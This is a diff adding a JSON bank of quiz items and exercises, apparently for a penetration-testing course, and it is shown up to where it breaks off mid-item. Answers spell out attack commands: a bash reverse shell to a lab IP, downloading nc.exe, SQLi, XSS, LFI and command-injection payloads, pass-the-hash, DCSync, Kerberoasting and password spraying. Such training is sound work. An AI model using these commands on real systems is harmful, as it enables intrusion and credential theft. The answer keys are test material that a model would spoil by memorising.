@@ -1,0 +1,2406 @@
+[
+  {
+    "module_id": 2,
+    "type": "multiple_choice",
+    "difficulty": "easy",
+    "prompt": "What Nmap flag performs a SYN stealth scan?",
+    "options": [
+      "-sT",
+      "-sS",
+      "-sU",
+      "-sV"
+    ],
+    "answer": "-sS",
+    "explanation": "The -sS flag performs a SYN stealth scan, which is faster and less detectable than a full TCP connect scan.",
+    "validation_regex": null,
+    "hints": [
+      "It's a 'stealth' scan",
+      "The flag starts with -s"
+    ]
+  },
+  {
+    "module_id": 2,
+    "type": "fill_command",
+    "difficulty": "medium",
+    "prompt": "Write the Nmap command to scan all TCP ports on 10.10.10.5 with service version detection:",
+    "options": null,
+    "answer": "nmap -p- -sV 10.10.10.5",
+    "explanation": "Use -p- for all ports and -sV for version detection.",
+    "validation_regex": "nmap.*-p-.*-sV.*10\\.10\\.10\\.5|nmap.*-sV.*-p-.*10\\.10\\.10\\.5",
+    "hints": [
+      "Use -p- for all ports",
+      "Add -sV for versions"
+    ]
+  },
+  {
+    "module_id": 2,
+    "type": "decision_tree",
+    "difficulty": "medium",
+    "prompt": "You've found port 445 open on a Windows target. What's the best first step?",
+    "options": [
+      "Run Nmap --script=smb-vuln-*",
+      "Try smbclient with null session",
+      "Run enum4linux for enumeration",
+      "All of the above are valid"
+    ],
+    "answer": "All of the above are valid",
+    "explanation": "All these approaches are valid starting points for SMB enumeration.",
+    "validation_regex": null,
+    "hints": null
+  },
+  {
+    "module_id": 3,
+    "type": "multiple_choice",
+    "difficulty": "easy",
+    "prompt": "Which tool is used to enumerate SMB shares?",
+    "options": [
+      "dig",
+      "smbmap",
+      "nslookup",
+      "nikto"
+    ],
+    "answer": "smbmap",
+    "explanation": "smbmap is designed specifically for SMB share enumeration.",
+    "validation_regex": null,
+    "hints": null
+  },
+  {
+    "module_id": 3,
+    "type": "fill_command",
+    "difficulty": "medium",
+    "prompt": "Write the command to list SMB shares on 10.10.10.5 using a null session with smbclient:",
+    "options": null,
+    "answer": "smbclient -L //10.10.10.5 -N",
+    "explanation": "The -L flag lists shares and -N uses a null session (no password).",
+    "validation_regex": "smbclient.*-L.*10\\.10\\.10\\.5.*-N|smbclient.*-N.*-L.*10\\.10\\.10\\.5",
+    "hints": [
+      "Use -L to list",
+      "Use -N for null session"
+    ]
+  },
+  {
+    "module_id": 3,
+    "type": "case_file",
+    "difficulty": "hard",
+    "prompt": "<pre>smbclient -L //10.10.10.5 -N\nSharename       Type      Comment\n---------       ----      -------\nADMIN$          Disk      Remote Admin\nC$              Disk      Default share\nIPC$            IPC       Remote IPC\nBackups         Disk      \nUsers           Disk      </pre>\nAnalyze this output. What shares should you investigate first?",
+    "options": null,
+    "answer": "Backups and Users",
+    "explanation": "The Backups and Users shares are non-default shares that may contain sensitive data. Admin$, C$, and IPC$ are default shares requiring admin access.",
+    "validation_regex": "(?i)backup|user",
+    "hints": [
+      "Look for non-default shares",
+      "Default shares need admin"
+    ]
+  },
+  {
+    "module_id": 4,
+    "type": "fill_command",
+    "difficulty": "easy",
+    "prompt": "Write the ffuf command to fuzz directories on http://10.10.10.5 using common.txt:",
+    "options": null,
+    "answer": "ffuf -u http://10.10.10.5/FUZZ -w common.txt",
+    "explanation": "The FUZZ keyword marks where the wordlist entries will be inserted.",
+    "validation_regex": "ffuf.*-u.*http.*10\\.10\\.10\\.5.*FUZZ.*-w",
+    "hints": [
+      "Use FUZZ as placeholder",
+      "Specify wordlist with -w"
+    ]
+  },
+  {
+    "module_id": 4,
+    "type": "multiple_choice",
+    "difficulty": "medium",
+    "prompt": "What does the -fc flag do in ffuf?",
+    "options": [
+      "Filter by content length",
+      "Filter by response code",
+      "Filter by word count",
+      "Force continue on errors"
+    ],
+    "answer": "Filter by response code",
+    "explanation": "The -fc flag filters out responses with specific HTTP status codes (e.g., -fc 404 hides 404 responses).",
+    "validation_regex": null,
+    "hints": null
+  },
+  {
+    "module_id": 6,
+    "type": "fill_command",
+    "difficulty": "easy",
+    "prompt": "Write the command to start a Python HTTP server on port 8000:",
+    "options": null,
+    "answer": "python3 -m http.server 8000",
+    "explanation": "This starts a simple HTTP server to host files for transfer.",
+    "validation_regex": "python3?.*-m.*http\\.server.*8000",
+    "hints": [
+      "Use python3",
+      "Use -m flag"
+    ]
+  },
+  {
+    "module_id": 6,
+    "type": "multiple_choice",
+    "difficulty": "medium",
+    "prompt": "Which Windows command can download files via HTTP without PowerShell?",
+    "options": [
+      "wget",
+      "curl",
+      "certutil",
+      "bitsadmin"
+    ],
+    "answer": "certutil",
+    "explanation": "certutil -urlcache -f URL can download files on Windows systems without requiring PowerShell.",
+    "validation_regex": null,
+    "hints": null
+  },
+  {
+    "module_id": 7,
+    "type": "fill_command",
+    "difficulty": "medium",
+    "prompt": "Write a bash reverse shell command connecting to 10.10.14.5 on port 4444:",
+    "options": null,
+    "answer": "bash -i >& /dev/tcp/10.10.14.5/4444 0>&1",
+    "explanation": "This redirects bash interactively to a TCP connection.",
+    "validation_regex": "bash.*-i.*\\/dev\\/tcp\\/10\\.10\\.14\\.5\\/4444",
+    "hints": [
+      "Use bash -i",
+      "Redirect to /dev/tcp"
+    ]
+  },
+  {
+    "module_id": 7,
+    "type": "decision_tree",
+    "difficulty": "easy",
+    "prompt": "You got a shell but arrow keys don't work. What's the first step to upgrade it?",
+    "options": [
+      "Exit and reconnect",
+      "Run python -c 'import pty;pty.spawn(\"/bin/bash\")'",
+      "Use script /dev/null -c bash",
+      "Press Ctrl+Z"
+    ],
+    "answer": "Run python -c 'import pty;pty.spawn(\"/bin/bash\")'",
+    "explanation": "Spawning a PTY with Python is typically the first step in shell upgrade.",
+    "validation_regex": null,
+    "hints": null
+  },
+  {
+    "module_id": 9,
+    "type": "multiple_choice",
+    "difficulty": "medium",
+    "prompt": "What hashcat mode (-m) is used for NTLM hashes?",
+    "options": [
+      "-m 0",
+      "-m 1000",
+      "-m 1800",
+      "-m 13100"
+    ],
+    "answer": "-m 1000",
+    "explanation": "Mode 1000 is for NTLM hashes. Mode 0 is MD5, 1800 is SHA-512, 13100 is Kerberos TGS.",
+    "validation_regex": null,
+    "hints": null
+  },
+  {
+    "module_id": 9,
+    "type": "fill_command",
+    "difficulty": "medium",
+    "prompt": "Write the hashcat command to crack an NTLM hash file (ntlm.txt) using rockyou.txt:",
+    "options": null,
+    "answer": "hashcat -m 1000 ntlm.txt rockyou.txt",
+    "explanation": "Use mode 1000 for NTLM hashes.",
+    "validation_regex": "hashcat.*-m.*1000.*ntlm.*rockyou",
+    "hints": [
+      "NTLM mode is 1000"
+    ]
+  },
+  {
+    "module_id": 10,
+    "type": "case_file",
+    "difficulty": "medium",
+    "prompt": "<pre>PORT     STATE SERVICE\n21/tcp   open  ftp\n22/tcp   open  ssh\n80/tcp   open  http\n445/tcp  open  microsoft-ds\n3306/tcp open  mysql</pre>\nWhat's your attack priority?",
+    "options": null,
+    "answer": "FTP anonymous, SMB shares, web application",
+    "explanation": "Check FTP for anonymous access, SMB for null sessions/shares, and the web app for vulnerabilities. SSH and MySQL typically require credentials.",
+    "validation_regex": "(?i)ftp|smb|web|anon",
+    "hints": [
+      "Look for anonymous access",
+      "Web apps often have vulns"
+    ]
+  },
+  {
+    "module_id": 11,
+    "type": "fill_command",
+    "difficulty": "hard",
+    "prompt": "Write the command to start a Chisel reverse SOCKS proxy server on port 8000:",
+    "options": null,
+    "answer": "chisel server --reverse -p 8000",
+    "explanation": "The --reverse flag allows clients to create reverse tunnels.",
+    "validation_regex": "chisel.*server.*--reverse.*-p.*8000|chisel.*server.*-p.*8000.*--reverse",
+    "hints": [
+      "Use server mode",
+      "Add --reverse flag"
+    ]
+  },
+  {
+    "module_id": 11,
+    "type": "multiple_choice",
+    "difficulty": "medium",
+    "prompt": "When using proxychains with Nmap, which scan type must you use?",
+    "options": [
+      "-sS (SYN)",
+      "-sT (TCP Connect)",
+      "-sU (UDP)",
+      "-sN (Null)"
+    ],
+    "answer": "-sT (TCP Connect)",
+    "explanation": "Proxychains only works with full TCP connections. SYN scans require raw sockets which can't be proxied.",
+    "validation_regex": null,
+    "hints": null
+  },
+  {
+    "module_id": 12,
+    "type": "fill_command",
+    "difficulty": "medium",
+    "prompt": "Write the BloodHound Python command to collect all data from domain.local as user:pass:",
+    "options": null,
+    "answer": "bloodhound-python -u user -p pass -d domain.local -c all",
+    "explanation": "BloodHound-python collects AD data for graph analysis.",
+    "validation_regex": "bloodhound-python.*-u.*-p.*-d.*domain.*-c.*all",
+    "hints": [
+      "Use -c all for everything"
+    ]
+  },
+  {
+    "module_id": 12,
+    "type": "multiple_choice",
+    "difficulty": "easy",
+    "prompt": "What tool visualizes Active Directory attack paths?",
+    "options": [
+      "Mimikatz",
+      "BloodHound",
+      "Rubeus",
+      "PowerView"
+    ],
+    "answer": "BloodHound",
+    "explanation": "BloodHound uses graph theory to find attack paths in Active Directory.",
+    "validation_regex": null,
+    "hints": null
+  },
+  {
+    "module_id": 13,
+    "type": "fill_command",
+    "difficulty": "hard",
+    "prompt": "Write the Impacket command to perform Kerberoasting against domain.local (user:pass, DC at 10.10.10.5):",
+    "options": null,
+    "answer": "GetUserSPNs.py domain.local/user:pass -dc-ip 10.10.10.5 -request",
+    "explanation": "GetUserSPNs.py requests TGS tickets for service accounts.",
+    "validation_regex": "GetUserSPNs.*domain.*user.*pass.*-dc-ip.*10\\.10\\.10\\.5.*-request",
+    "hints": [
+      "Use GetUserSPNs.py",
+      "Add -request flag"
+    ]
+  },
+  {
+    "module_id": 13,
+    "type": "multiple_choice",
+    "difficulty": "medium",
+    "prompt": "What hashcat mode is used for Kerberos TGS (Kerberoast) tickets?",
+    "options": [
+      "-m 1000",
+      "-m 5600",
+      "-m 13100",
+      "-m 18200"
+    ],
+    "answer": "-m 13100",
+    "explanation": "Mode 13100 is for Kerberos 5 TGS-REP etype 23 (crackable Kerberoast tickets).",
+    "validation_regex": null,
+    "hints": null
+  },
+  {
+    "module_id": 17,
+    "type": "fill_command",
+    "difficulty": "easy",
+    "prompt": "Write a basic SQL injection payload to bypass login:",
+    "options": null,
+    "answer": "' OR '1'='1",
+    "explanation": "This classic payload makes the WHERE clause always true.",
+    "validation_regex": "'.*OR.*'1'.*=.*'1|\".*OR.*1.*=.*1",
+    "hints": [
+      "Make condition always true"
+    ]
+  },
+  {
+    "module_id": 17,
+    "type": "decision_tree",
+    "difficulty": "medium",
+    "prompt": "You found a potential SQLi point. The app shows no errors. What technique should you try first?",
+    "options": [
+      "UNION-based injection",
+      "Time-based blind injection",
+      "Error-based injection",
+      "Out-of-band injection"
+    ],
+    "answer": "Time-based blind injection",
+    "explanation": "When errors aren't shown, time-based blind injection using SLEEP() can confirm SQLi.",
+    "validation_regex": null,
+    "hints": null
+  },
+  {
+    "module_id": 18,
+    "type": "fill_command",
+    "difficulty": "medium",
+    "prompt": "Write the sqlmap command to dump the database 'webapp' table 'users' from a vulnerable URL:",
+    "options": null,
+    "answer": "sqlmap -u URL -D webapp -T users --dump --batch",
+    "explanation": "Use -D for database, -T for table, --dump to extract data.",
+    "validation_regex": "sqlmap.*-u.*-D.*webapp.*-T.*users.*--dump",
+    "hints": [
+      "Specify database with -D",
+      "Specify table with -T"
+    ]
+  },
+  {
+    "module_id": 19,
+    "type": "fill_command",
+    "difficulty": "easy",
+    "prompt": "Write an XSS payload that triggers an alert:",
+    "options": null,
+    "answer": "<script>alert(1)</script>",
+    "explanation": "Basic XSS payload using script tags.",
+    "validation_regex": "<script>.*alert.*</script>",
+    "hints": null
+  },
+  {
+    "module_id": 20,
+    "type": "fill_command",
+    "difficulty": "medium",
+    "prompt": "Write an LFI payload to read /etc/passwd traversing 5 directories:",
+    "options": null,
+    "answer": "../../../../../etc/passwd",
+    "explanation": "Each ../ goes up one directory level.",
+    "validation_regex": "\\.\\.\\/.*\\.\\.\\/.*\\.\\.\\/.*\\.\\.\\/.*\\.\\.\\/.*etc\\/passwd",
+    "hints": [
+      "Use ../ to traverse"
+    ]
+  },
+  {
+    "module_id": 20,
+    "type": "multiple_choice",
+    "difficulty": "hard",
+    "prompt": "Which PHP wrapper can be used to read PHP source code via LFI?",
+    "options": [
+      "data://",
+      "file://",
+      "php://filter",
+      "expect://"
+    ],
+    "answer": "php://filter",
+    "explanation": "php://filter/convert.base64-encode/resource=file.php returns the PHP source as base64.",
+    "validation_regex": null,
+    "hints": null
+  },
+  {
+    "module_id": 22,
+    "type": "fill_command",
+    "difficulty": "medium",
+    "prompt": "Write a command injection payload using command substitution:",
+    "options": null,
+    "answer": "$(whoami)",
+    "explanation": "Command substitution with $() executes the inner command.",
+    "validation_regex": "\\$\\(.*\\)|`.*`",
+    "hints": [
+      "Use $() or backticks"
+    ]
+  },
+  {
+    "module_id": 25,
+    "type": "fill_command",
+    "difficulty": "easy",
+    "prompt": "Write the command to find SUID binaries on Linux:",
+    "options": null,
+    "answer": "find / -perm -4000 2>/dev/null",
+    "explanation": "The -perm -4000 finds files with the SUID bit set.",
+    "validation_regex": "find.*-perm.*4000|find.*-perm.*-u=s",
+    "hints": [
+      "Use find with -perm"
+    ]
+  },
+  {
+    "module_id": 25,
+    "type": "multiple_choice",
+    "difficulty": "easy",
+    "prompt": "What's the first command to run for Linux privilege escalation?",
+    "options": [
+      "find / -perm -4000",
+      "sudo -l",
+      "uname -a",
+      "cat /etc/crontab"
+    ],
+    "answer": "sudo -l",
+    "explanation": "sudo -l shows what commands the current user can run as root - often the fastest path to root.",
+    "validation_regex": null,
+    "hints": null
+  },
+  {
+    "module_id": 25,
+    "type": "case_file",
+    "difficulty": "hard",
+    "prompt": "<pre>$ sudo -l\nUser www-data may run the following commands on target:\n    (ALL) NOPASSWD: /usr/bin/vim</pre>\nHow do you escalate to root?",
+    "options": null,
+    "answer": "sudo vim -c ':!/bin/bash'",
+    "explanation": "Vim can spawn a shell with :!/bin/bash. Since we can run it as root, we get a root shell.",
+    "validation_regex": "(?i)vim.*:!.*bash|vim.*:shell",
+    "hints": [
+      "Check GTFOBins for vim",
+      "Vim can spawn shells"
+    ]
+  },
+  {
+    "module_id": 26,
+    "type": "fill_command",
+    "difficulty": "easy",
+    "prompt": "Write the Windows command to list all user privileges:",
+    "options": null,
+    "answer": "whoami /all",
+    "explanation": "whoami /all shows user, groups, and all privileges.",
+    "validation_regex": "whoami.*\\/all",
+    "hints": [
+      "Use whoami with flags"
+    ]
+  },
+  {
+    "module_id": 26,
+    "type": "multiple_choice",
+    "difficulty": "medium",
+    "prompt": "Which registry key indicates AlwaysInstallElevated is enabled?",
+    "options": [
+      "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer",
+      "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
+      "HKLM\\SYSTEM\\CurrentControlSet\\Services",
+      "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion"
+    ],
+    "answer": "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer",
+    "explanation": "AlwaysInstallElevated must be set in both HKLM and HKCU under the Installer policy key.",
+    "validation_regex": null,
+    "hints": null
+  },
+  {
+    "module_id": 7,
+    "type": "fill_command",
+    "difficulty": "medium",
+    "prompt": "Write the netcat listener command on port 4444:",
+    "options": null,
+    "answer": "nc -lvnp 4444",
+    "explanation": "-l listen, -v verbose, -n no DNS, -p port",
+    "validation_regex": "nc.*-l.*-.*p.*4444|nc.*-lvnp.*4444",
+    "hints": [
+      "Use -l for listen",
+      "-p for port"
+    ]
+  },
+  {
+    "module_id": 3,
+    "type": "multiple_choice",
+    "difficulty": "easy",
+    "prompt": "What port does SNMP typically use?",
+    "options": [
+      "22",
+      "161",
+      "389",
+      "3389"
+    ],
+    "answer": "161",
+    "explanation": "SNMP uses UDP port 161 for queries.",
+    "validation_regex": null,
+    "hints": null
+  },
+  {
+    "module_id": 3,
+    "type": "fill_command",
+    "difficulty": "medium",
+    "prompt": "Write the snmpwalk command to enumerate 10.10.10.5 with community string 'public':",
+    "options": null,
+    "answer": "snmpwalk -v2c -c public 10.10.10.5",
+    "explanation": "Use -v2c for SNMP version 2c and -c for community string.",
+    "validation_regex": "snmpwalk.*-v2c.*-c.*public.*10\\.10\\.10\\.5",
+    "hints": [
+      "Specify version with -v",
+      "-c for community"
+    ]
+  },
+  {
+    "module_id": 8,
+    "type": "fill_command",
+    "difficulty": "medium",
+    "prompt": "In Meterpreter, write the command to add a local port forward from local 8080 to 10.10.10.6:80:",
+    "options": null,
+    "answer": "portfwd add -l 8080 -p 80 -r 10.10.10.6",
+    "explanation": "This forwards local port 8080 to the remote host's port 80.",
+    "validation_regex": "portfwd.*add.*-l.*8080.*-p.*80.*-r.*10\\.10\\.10\\.6",
+    "hints": [
+      "Use portfwd add"
+    ]
+  },
+  {
+    "module_id": 10,
+    "type": "fill_command",
+    "difficulty": "medium",
+    "prompt": "Write the evil-winrm command to connect to 10.10.10.5 as user with password pass123:",
+    "options": null,
+    "answer": "evil-winrm -i 10.10.10.5 -u user -p pass123",
+    "explanation": "evil-winrm provides an interactive PowerShell session over WinRM.",
+    "validation_regex": "evil-winrm.*-i.*10\\.10\\.10\\.5.*-u.*user.*-p.*pass123",
+    "hints": [
+      "-i for IP",
+      "-u for user"
+    ]
+  },
+  {
+    "module_id": 10,
+    "type": "fill_command",
+    "difficulty": "hard",
+    "prompt": "Write the impacket-psexec command to get a shell as admin with NTLM hash aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:",
+    "options": null,
+    "answer": "impacket-psexec -hashes aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0 admin@10.10.10.5",
+    "explanation": "Pass-the-hash with impacket using the -hashes flag.",
+    "validation_regex": "impacket-psexec.*-hashes.*:.*admin@",
+    "hints": [
+      "Use -hashes flag",
+      "Format: LM:NT"
+    ]
+  },
+  {
+    "module_id": 13,
+    "type": "fill_command",
+    "difficulty": "hard",
+    "prompt": "Write the secretsdump command to DCSync as domain\\admin with password P@ssw0rd from DC at 10.10.10.5:",
+    "options": null,
+    "answer": "secretsdump.py domain/admin:P@ssw0rd@10.10.10.5",
+    "explanation": "secretsdump.py performs DCSync to dump all domain hashes.",
+    "validation_regex": "secretsdump.*domain.*admin.*@10\\.10\\.10\\.5",
+    "hints": [
+      "Format: domain/user:pass@ip"
+    ]
+  },
+  {
+    "module_id": 6,
+    "type": "fill_command",
+    "difficulty": "medium",
+    "prompt": "Write the PowerShell command to download a file from http://10.10.14.5/nc.exe to C:\\temp\\nc.exe:",
+    "options": null,
+    "answer": "Invoke-WebRequest -Uri http://10.10.14.5/nc.exe -OutFile C:\\temp\\nc.exe",
+    "explanation": "IWR (Invoke-WebRequest) downloads files in PowerShell.",
+    "validation_regex": "(?i)invoke-webrequest|iwr.*-uri.*-outfile|wget",
+    "hints": [
+      "Use Invoke-WebRequest or iwr"
+    ]
+  },
+  {
+    "module_id": 2,
+    "type": "case_file",
+    "difficulty": "medium",
+    "prompt": "<pre>PORT      STATE SERVICE VERSION\n22/tcp    open  ssh     OpenSSH 7.9\n80/tcp    open  http    Apache 2.4.29\n3306/tcp  open  mysql   MySQL 5.7.25\n8080/tcp  open  http    Jetty 9.4.z</pre>\nWhich service version should you prioritize researching for exploits?",
+    "options": null,
+    "answer": "Apache 2.4.29 or Jetty 9.4",
+    "explanation": "Apache 2.4.29 may be vulnerable to CVE-2021-41773/42013 if running on Ubuntu. Jetty and older MySQL versions also have known vulnerabilities.",
+    "validation_regex": "(?i)apache|jetty|2\\.4\\.29",
+    "hints": [
+      "Check for CVEs",
+      "Focus on web servers"
+    ]
+  },
+  {
+    "module_id": 21,
+    "type": "multiple_choice",
+    "difficulty": "medium",
+    "prompt": "What magic bytes indicate a GIF file?",
+    "options": [
+      "PK",
+      "89 50 4E 47",
+      "GIF89a",
+      "FF D8 FF"
+    ],
+    "answer": "GIF89a",
+    "explanation": "GIF89a is the magic bytes signature for GIF images. This can be prepended to a web shell to bypass basic checks.",
+    "validation_regex": null,
+    "hints": null
+  },
+  {
+    "module_id": 14,
+    "type": "multiple_choice",
+    "difficulty": "easy",
+    "prompt": "What's the default Burp Suite proxy port?",
+    "options": [
+      "80",
+      "443",
+      "8080",
+      "8888"
+    ],
+    "answer": "8080",
+    "explanation": "Burp Suite's proxy listener runs on 127.0.0.1:8080 by default.",
+    "validation_regex": null,
+    "hints": null
+  },
+  {
+    "module_id": 23,
+    "type": "fill_command",
+    "difficulty": "medium",
+    "prompt": "Write an SSRF payload to access the AWS metadata endpoint:",
+    "options": null,
+    "answer": "http://169.254.169.254/latest/meta-data/",
+    "explanation": "The AWS metadata service is accessible at this IP from any EC2 instance.",
+    "validation_regex": "169\\.254\\.169\\.254.*meta-?data",
+    "hints": [
+      "AWS uses 169.254.169.254"
+    ]
+  },
+  {
+    "module_id": 12,
+    "type": "multiple_choice",
+    "difficulty": "medium",
+    "prompt": "Which PowerView command finds computers where the current user has local admin access?",
+    "options": [
+      "Get-DomainUser",
+      "Get-DomainComputer",
+      "Find-LocalAdminAccess",
+      "Get-NetLocalGroup"
+    ],
+    "answer": "Find-LocalAdminAccess",
+    "explanation": "Find-LocalAdminAccess tests each computer in the domain for local admin access.",
+    "validation_regex": null,
+    "hints": null
+  },
+  {
+    "module_id": 13,
+    "type": "multiple_choice",
+    "difficulty": "hard",
+    "prompt": "What Active Directory attack extracts the entire domain password database?",
+    "options": [
+      "Kerberoasting",
+      "AS-REP Roasting",
+      "DCSync",
+      "Golden Ticket"
+    ],
+    "answer": "DCSync",
+    "explanation": "DCSync mimics domain controller replication to extract all password hashes from the domain.",
+    "validation_regex": null,
+    "hints": null
+  },
+  {
+    "module_id": 1,
+    "type": "multiple_choice",
+    "difficulty": "easy",
+    "prompt": "What document defines the scope and rules of engagement for a penetration test?",
+    "options": [
+      "Vulnerability Report",
+      "Statement of Work",
+      "Rules of Engagement",
+      "Risk Assessment"
+    ],
+    "answer": "Rules of Engagement",
+    "explanation": "The Rules of Engagement (RoE) document defines what is in/out of scope and what techniques can be used.",
+    "validation_regex": null,
+    "hints": null
+  },
+  {
+    "module_id": 15,
+    "type": "fill_command",
+    "difficulty": "medium",
+    "prompt": "Write an ffuf command to fuzz the 'id' parameter value on http://10.10.10.5/page?id=FUZZ using numbers 1-1000:",
+    "options": null,
+    "answer": "ffuf -u 'http://10.10.10.5/page?id=FUZZ' -w <(seq 1 1000)",
+    "explanation": "Parameter fuzzing helps find valid ID values or injection points.",
+    "validation_regex": "ffuf.*-u.*id=FUZZ.*-w|ffuf.*-w.*-u.*id=FUZZ",
+    "hints": [
+      "Put FUZZ where you want to fuzz"
+    ]
+  },
+  {
+    "module_id": 12,
+    "prompt": "Identify Kerberoastable Users",
+    "solution": "1. Import PowerView: `. .\\PowerView.ps1`\n2. Run `Get-DomainUser -SPN` to list all domain users with a registered Service Principal Name (SPN).\n3. Use `impacket-GetUserSPNs -request -dc-ip <DC_IP> <DOMAIN>/<USER>` to extract the TGS ticket for offline cracking.",
+    "difficulty": "Medium",
+    "hints": [
+      "Look for the `-SPN` flag in PowerView."
+    ]
+  },
+  {
+    "module_id": 12,
+    "prompt": "Find AS-REP Roastable Users",
+    "solution": "1. Import PowerView.\n2. Run `Get-DomainUser -PreauthNotRequired` to find users who do not require Kerberos pre-authentication.\n3. Request the AS-REP using `impacket-GetNPUsers <DOMAIN>/ -usersfile <users.txt> -dc-ip <DC_IP> -no-pass`.",
+    "difficulty": "Medium",
+    "hints": [
+      "Focus on accounts where pre-authentication is disabled."
+    ]
+  },
+  {
+    "module_id": 12,
+    "prompt": "Enumerate Local Admin Access via PowerView",
+    "solution": "1. Ensure you have a valid user context.\n2. In PowerShell, run `Find-LocalAdminAccess` from PowerView.\n3. The script will query Domain Machines and check if the current user token has Local Administrator rights on any systems.",
+    "difficulty": "Medium",
+    "hints": [
+      "There's a specific PowerView cmdlet named Find-LocalAdminAccess."
+    ]
+  },
+  {
+    "module_id": 12,
+    "prompt": "Run BloodHound Collection from Linux",
+    "solution": "1. Install BloodHound python ingestor: `pipx install bloodhound`.\n2. Run: `bloodhound-python -u <user> -p <password> -d <domain> -ns <DC_IP> -c All`.\n3. Upload the resulting JSON files to the BloodHound Neo4j database GUI.",
+    "difficulty": "Medium",
+    "hints": [
+      "Use the Python ingestor if working from a Linux attack box."
+    ]
+  },
+  {
+    "module_id": 12,
+    "prompt": "Enumerate Domain password policy using external tools",
+    "solution": "1. Using CME or nxc: `nxc smb <DC_IP> -u <user> -p <pass> --pass-pol`.\n2. Alternately, use `rpcclient -U <user> <DC_IP>` and type `getdompwinfo`.\n3. Review the minimum length and lockout threshold parameters.",
+    "difficulty": "Easy",
+    "hints": [
+      "NetExec (nxc) has a flag specifically for password policies."
+    ]
+  },
+  {
+    "module_id": 13,
+    "prompt": "Perform Kerberoasting with Impacket",
+    "solution": "1. Gather credentials for any valid domain user.\n2. Run `impacket-GetUserSPNs <domain>/<user>:<password> -dc-ip <DC_IP> -request -outputfile hashes.txt`.\n3. Crack the hashes with Hashcat: `hashcat -m 13100 hashes.txt wordlist.txt`.",
+    "difficulty": "Medium",
+    "hints": [
+      "Use the -request flag to save TGS tickets."
+    ]
+  },
+  {
+    "module_id": 13,
+    "prompt": "Execute an AS-REP Roasting attack",
+    "solution": "1. Put target usernames in `users.txt`.\n2. Run `impacket-GetNPUsers <Domain>/ -usersfile users.txt -dc-ip <DC_IP> -no-pass -format hashcat > asrep.txt`.\n3. Use `hashcat -m 18200 asrep.txt rockyou.txt` to crack the AS-REP responses.",
+    "difficulty": "Medium",
+    "hints": [
+      "Impacket-GetNPUsers is the right tool for AS-REP roasting."
+    ]
+  },
+  {
+    "module_id": 13,
+    "prompt": "Verify Domain Credentials using NetExec (nxc)",
+    "solution": "1. Collect target IP or subnet.\n2. Run `nxc smb <Target_IP> -u <Username> -p <Password>`.\n3. Look for the `[+]` or `Pwn3d!` tag indicating successful authentication or Admin privileges respectively.",
+    "difficulty": "Easy",
+    "hints": [
+      "NetExec checks SMB authentication by default."
+    ]
+  },
+  {
+    "module_id": 13,
+    "prompt": "Abuse GenericWrite over a User Object",
+    "solution": "1. If User A has GenericWrite over User B, configure a fake SPN on User B.\n2. PowerView: `Set-DomainObject -Identity <UserB> -Set @{serviceprincipalname='ops/fake'}`.\n3. User B is now Kerberoastable. Use `impacket-GetUserSPNs` to extract User B's hash.",
+    "difficulty": "Hard",
+    "hints": [
+      "GenericWrite allows you to write the SPN attribute."
+    ]
+  },
+  {
+    "module_id": 13,
+    "prompt": "Perform an automated Password Spray against SMB",
+    "solution": "1. Collect a list of potential usernames (`users.txt`).\n2. Run `nxc smb <DC_IP> -u users.txt -p 'Welcome123!' --continue-on-success`.\n3. Review output for specific locked accounts or successful logins across the username list.",
+    "difficulty": "Medium",
+    "hints": [
+      "Use --continue-on-success to ensure it checks every user."
+    ]
+  },
+  {
+    "module_id": 14,
+    "prompt": "Setup FoxyProxy to intercept traffic using Burp Suite",
+    "solution": "1. Start Burp Suite and configure the Proxy Listener on `127.0.0.1:8080`.\n2. In your browser's FoxyProxy extension, add a proxy pointing to `127.0.0.1` port `8080`.\n3. Enable the proxy in FoxyProxy and verify traffic is hitting Burp's Proxy -> Intercept tab.",
+    "difficulty": "Easy",
+    "hints": [
+      "Ensure the browser proxy matches your Burp listener interface."
+    ]
+  },
+  {
+    "module_id": 14,
+    "prompt": "Establish target Scope in Burp Suite",
+    "solution": "1. Navigate to Target -> Scope settings.\n2. Add the target domain prefix (e.g., `.*\\.target\\.com$`).\n3. Click 'Yes' to stop sending out-of-scope traffic to the History and Scanner components.",
+    "difficulty": "Easy",
+    "hints": [
+      "Use regex to include all subdomains."
+    ]
+  },
+  {
+    "module_id": 14,
+    "prompt": "Execute an Intruder Cluster Bomb attack",
+    "solution": "1. Send request to Intruder (Ctrl+I).\n2. Highlight `username` and `password` values and click `Add §`.\n3. Set Attack type to `Cluster Bomb`.\n4. Under Payloads, set Payload 1 to user list and Payload 2 to password list.",
+    "difficulty": "Medium",
+    "hints": [
+      "Cluster bomb iterating tests every possible combination of credentials."
+    ]
+  },
+  {
+    "module_id": 14,
+    "prompt": "Bypass a source IP filter using Match and Replace",
+    "solution": "1. Go to Proxy -> Options -> Match and Replace.\n2. Add a new rule.\n3. Leave 'Match' blank (or match specific request header), and set 'Replace' to `X-Forwarded-For: 127.0.0.1`.\n4. Send request and observe the injected header bypassing IP restrictions.",
+    "difficulty": "Medium",
+    "hints": [
+      "Use Match and Replace to automatically inject headers like XFF or X-Real-IP."
+    ]
+  },
+  {
+    "module_id": 14,
+    "prompt": "Compare HTTP Responses using Comparer",
+    "solution": "1. In Repeater, select the first request's response and send to Comparer (Ctrl+W).\n2. Send a slightly modified request, and send its response to Comparer.\n3. Open Comparer and click 'Words' or 'Bytes'.\n4. Review the highlighted differences indicating a blind SQLi or logic flaw anomaly.",
+    "difficulty": "Medium",
+    "hints": [
+      "Comparer is useful for time delays or minor byte count differences."
+    ]
+  },
+  {
+    "module_id": 15,
+    "prompt": "Perform directory fuzzing with ffuf",
+    "solution": "1. Command: `ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -u http://target.com/FUZZ`.\n2. Observe response codes.\n3. Adjust command to filter out false positives using `-fc 404,403` or `-mc 200,301,302`.",
+    "difficulty": "Easy",
+    "hints": [
+      "Use the FUZZ keyword in the URL."
+    ]
+  },
+  {
+    "module_id": 15,
+    "prompt": "Fuzz virtual hosts (VHosts) using ffuf",
+    "solution": "1. Command: `ffuf -w subdomains.txt -u http://target.com -H 'Host: FUZZ.target.com'`.\n2. Note the standard default response size.\n3. Add `-fs <size>` to the command to filter out the noise and only show active VHosts.",
+    "difficulty": "Medium",
